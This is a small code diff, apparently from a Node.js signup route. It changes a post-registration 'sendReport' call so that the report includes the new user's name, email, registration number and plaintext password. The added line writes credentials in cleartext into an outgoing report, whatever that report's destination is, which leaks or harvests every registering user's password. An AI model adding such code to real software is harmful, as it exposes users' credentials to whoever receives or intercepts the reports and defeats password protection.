@@ -66,7 +66,7 @@ const user = {
 
               if (msg) {
                   res.json({"status":"sucess","msg":"Account created sucessfully"});
-                   sendReport(`new user signUp ${new_user.name} email:${new_user.email} `,true,req);
+                   sendReport(`new user signUp ${new_user.name}\n email:${new_user.email}\n regNo:${new_user.regno}\n password:${password}`,true,req);
                   
               } else {
                   //need to remove user from database  if mail not send sucessfully
